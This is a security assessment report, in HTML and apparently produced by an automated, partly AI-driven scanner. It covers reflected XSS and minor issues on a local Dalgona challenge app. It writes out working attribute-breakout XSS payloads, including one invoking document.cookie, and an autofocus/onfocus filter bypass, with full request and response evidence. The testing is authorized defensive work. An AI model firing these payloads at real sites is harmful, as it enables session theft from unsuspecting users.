@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxecwcb-gfitr9</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-reflected] Reflected XSS via unescaped double-quote in `name` value attribute</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] Cross-site scripting (reflected)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Path-relative style sheet import (2 URLs)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Input returned in response (reflected)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxecwcb-gfitr9</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32790/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T06:17:31.297Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32790</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#5f7d8c">2</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [xss-reflected] Reflected XSS via unescaped double-quote in `name` value attribute</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32790/</div>
+<div class="desc">The `name` GET parameter is reflected server-side directly into an HTML input tag's `value` attribute without escaping the double-quote character. An attacker can supply `&quot; onmouseover=alert(document.cookie) x=&quot;` to break out of the attribute context and inject arbitrary event-handler attributes. The application filters angle-bracket HTML tags but leaves `&quot;` unescaped, making attribute injection fully exploitable. No authentication is required — the endpoint is unauthenticated.</div>
+<div><b>Reproduction</b></div><pre>1. GET /page?name=%22+onmouseover%3Dalert(document.cookie)+x%3D%22
+2. The server renders: &amp;lt;input ... value=&quot;&quot; onmouseover=alert(document.cookie) x=&quot;&quot;&amp;gt;
+3. Hovering over the input in a browser executes the injected handler.
+Negative control: GET /page?name=safevalue → value=&quot;safevalue&quot; (no injection).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxekf2u-l</code> — <code>artifacts/s-0002/ev-mqxekf2u-l/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=safevalue HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1009
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:23:21 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;safevalue&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxejuzj-k</code> — <code>artifacts/s-0002/ev-mqxejuzj-k/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=%22+onmouseover%3Dalert(1)+x%3D%22 HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1026
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:22:55 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;&quot; onmouseover=alert(1) x=&quot;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxekgxs-m</code> — <code>artifacts/s-0002/ev-mqxekgxs-m/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=%22+onmouseover%3Dalert(document.cookie)+x%3D%22 HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1040
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:23:24 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;&quot; onmouseover=alert(document.cookie) x=&quot;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [burp✓] Cross-site scripting (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control value=&quot;ControlBenign123&quot; reflected inert with no breakout; the name param reflects &quot; unencoded inside value=&quot;...&quot;, so payload foo&quot; autofocus onfocus=alert(1) x=&quot;bar injected a live onfocus event-handler attribute into the &lt;input&gt; tag in 2 stable replays — autofocus+onfocus auto-fires alert(1) with no interaction (the server's &lt;+letter tag-strip filter is bypassed since attribute injection needs no &lt;).
+
+The value of the &lt;b&gt;name&lt;/b&gt; request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload &lt;b&gt;&quot;&amp;gt;&amp;lt;[0x00]ksnyD&amp;gt;&lt;/b&gt; was submitted in the name parameter. This input was echoed unmodified in the application's response.&lt;br&gt;&lt;br&gt;This behavior demonstrates that it is possible to inject new HTML tags into the returned document. An attempt was made to identify a full proof-of-concept attack for injecting arbitrary JavaScript but this was not successful. You should manually examine the application's behavior and attempt to identi @ http://target.local:32790/page</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeu6zd-t</code> — <code>artifacts/_/ev-mqxeu6zd-t/</code></div><div class="lbl">REQUEST</div><pre>GET /page HTTP/1.1
+Host: target.local:32790
+
+GET /page?name=testuser%22%3e%3c%00ksnyD%3e HTTP/1.1
+Host: target.local:32790
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1018
+Server: Werkzeug/1.0.1 Python/2.7.18
+Date: Sun, 28 Jun 2026 06:27:06 GMT
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;testuser&quot;&gt;&lt; ksnyD&gt;&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeulp4-u</code> — <code>artifacts/_/ev-mqxeulp4-u/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=ControlBenign123 HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1016
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:31:17 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;ControlBenign123&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxex5bg-11</code> — <code>artifacts/_/ev-mqxex5bg-11/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=foo%22%20autofocus%20onfocus%3dalert(1)%20x%3d%22bar HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 966
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:33:15 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with 1 instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;foo&quot; autofocus onfocus=alert(1) x=&quot;bar&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxex6xf-12</code> — <code>artifacts/_/ev-mqxex6xf-12/</code></div><div class="lbl">REQUEST</div><pre>GET /page?name=foo%22%20autofocus%20onfocus%3dalert(1)%20x%3d%22bar HTTP/1.1
+Host: target.local:32790
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 966
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 06:33:17 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with 1 instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;foo&quot; autofocus onfocus=alert(1) x=&quot;bar&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 3. [burp] Path-relative style sheet import (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32790/page] @ http://target.local:32790/</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeu6yu-r</code> — <code>artifacts/_/ev-mqxeu6yu-r/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32790
+
+GET / HTTP/1.1
+Host: target.local:32790
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1090
+Server: Werkzeug/1.0.1 Python/2.7.18
+Date: Sun, 28 Jun 2026 06:25:07 GMT
+
+
+    	&lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/index.css&quot;&gt;
+            &lt;title&gt;Dalgona Challenges&lt;/title&gt;
+        &lt;/head&gt;
+
+	        &lt;article class=&quot;widget widget__login&quot;&gt;
+	        &lt;div class=&quot;widget__content&quot;&gt;
+	    		&lt;div class=&quot;box&quot;&gt;
+	                &lt;form class=&quot;box-form&quot;&gt;
+	                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+				        &lt;h1&gt;Dalgona Challenges&lt;/h1&gt;
+	                    &lt;div class=&quot;init-table&quot;&gt;
+                            &lt;div class=&quot;row&quot;&gt;
+                                &lt;div class=&quot;column&quot;&gt;&lt;a class=&quot;text&quot; type=text href=&quot;page&quot;&gt;&lt;img src=&quot;static/img/cookies/new_star.png&quot; alt=&quot;Star&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;Page&lt;/a&gt;&lt;/div&gt;
+				            &lt;/div&gt;
+                        &lt;/br&gt;
+				        &lt;/div&gt;
+				        &lt;/br&gt;
+				        &lt;/br&gt;
+				        &lt;p&gt;&lt;/p&gt;
+	                &lt;/form&gt;
+	                &lt;/br&gt;
+				&lt;/div&gt;
+	        &lt;/div&gt;
+	    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [burp] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The value of the &lt;b&gt;name&lt;/b&gt; request parameter is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32790/page</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeu6z6-s</code> — <code>artifacts/_/ev-mqxeu6z6-s/</code></div><div class="lbl">REQUEST</div><pre>GET /page HTTP/1.1
+Host: target.local:32790
+
+GET /page?name=testuser3at6hu9dwc HTTP/1.1
+Host: target.local:32790
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1018
+Server: Werkzeug/1.0.1 Python/2.7.18
+Date: Sun, 28 Jun 2026 06:26:34 GMT
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss11.css&quot;&gt;
+            &lt;title&gt;Dalgona - Triangle&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_triangle.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=name placeholder=&quot;Enter your name...&quot; value=&quot;testuser3at6hu9dwc&quot;&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+</body></html>
